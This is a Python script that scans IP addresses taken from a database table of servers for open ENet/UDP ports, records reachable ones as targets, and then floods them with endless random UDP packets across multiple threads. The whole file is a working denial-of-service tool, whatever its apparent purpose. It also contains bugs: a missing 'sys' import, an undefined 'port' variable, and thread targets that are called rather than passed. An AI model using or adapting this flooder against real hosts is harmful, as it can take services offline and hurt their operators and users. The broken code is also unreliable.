import random
import socket
import threading
import os
import enet
import time
import psycopg2
from datetime import datetime as dt

udp_flood_packet_size=int(os.environ.get('UDP_FLOOD_PACKET_SIZE'))
num_of_flood_threads=int(os.environ.get('NUM_OF_FLOOD_THREADS'))
sleep_between_flood=int(os.environ.get('SLEEP_BETWEEN_FLOOD'))
port_range_min=int(os.environ.get('UDP_PORT_MIN'))
port_range_max=int(os.environ.get('UDP_PORT_MAX'))
user=os.environ['PGUSER']
password=os.environ['PGPASSWORD']
host=os.environ['PGHOST']
database=os.environ['PGUSER']


def db_read(sql,param):
  try:
    connection = psycopg2.connect(user=user,
      password=password,
      host=host,
      port="5432",
      database=database)
    cursor = connection.cursor()
    cursor.execute(sql,param)
    rows = cursor.fetchall()
    return rows
  except (Exception, psycopg2.Error) as error:
    print("Failed to insert/update", error)
    sys.stdout.flush()
  finally:
    if connection:
        cursor.close()
        connection.close()

def db_write(sql,param):
  try:
    connection = psycopg2.connect(user=user,
      password=password,
      host=host,
      port="5432",
      database=database)
    cursor = connection.cursor()
    cursor.execute(sql,param)
    connection.commit()
    count = cursor.rowcount
  except (Exception, psycopg2.Error) as error:
    print("Failed to insert/update", error)
    sys.stdout.flush()
  finally:
    if connection:
      cursor.close()
      connection.close()

def check_udp_endpoint(udp_socket_ip,udp_socket_port):
  _udp_socket_ip=udp_socket_ip.encode('utf-8')
  host = enet.Host(None, 1, 0, 0) 
  addr=enet.Address(_udp_socket_ip,udp_socket_port)
  peer = host.connect(addr,1)
  status="unknown"
  if peer:
    print("%s:" % peer)
    event = host.service(1000)
    if event.type == enet.EVENT_TYPE_CONNECT:
      print("%s: CONNECT" % event.peer.address)
      status="true"
    elif event.type == enet.EVENT_TYPE_DISCONNECT:
      print("%s: DISCONNECT" % event.peer.address)
      status="false"
  return status 

def flood_endpoint(udp_socket_ip,udp_socket_port):
  data = random._urandom(udp_flood_packet_size)
  while True:
    try:
      s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
      addr = (udp_socket_ip,udp_socket_port)
      s.sendto(data,addr)
      print("sent to {0}".format(addr),flush=True)
    except:
      print("error with {0}".format(addr),flush=True)
    time.sleep(sleep_between_flood)

def scan_endpoints():
  print("scan_endpoints")
  sql = """select ip from ipv4_baseline;"""
  params = []
  rows = list(db_read(sql,params))
  for ipv4 in rows:
    for port in range(port_range_min,port_range_max):
      status=check_udp_endpoint(ipv4[0],port)
      print("{0}:{1} is {2}".format(ipv4[0],port,status),flush=True)
      if status=="true":
        sql = """insert into target_endpoint(created_at,ip,port) values (%s,%s,%s)"""
        params=[dt.now(),ipv4[0],port]
        db_write(sql,params)
        time.sleep(sleep_between_flood)

def update_baseline():
  print("update_baseline")
  sql = """insert into ipv4_baseline(created_at,ip) select now(), ip from (select distinct split_part(endpoint,':',1) ip from servers) as t where t.ip not in (select ip from ipv4_baseline);"""
  params=[]
  db_write(sql,params)

def flood_endpoints():
  sql = """select ip,port from target_endpoint;"""
  params = []
  rows = list(db_read(sql,params))
  for ipv4 in rows:
    status=check_udp_endpoint(ipv4[0],port) 
    if status=="true":
      for y in range(num_of_flood_threads):
        _thread=threading.Thread(target=flood_endpoint(ipv4[0],port))
        _thread.start()
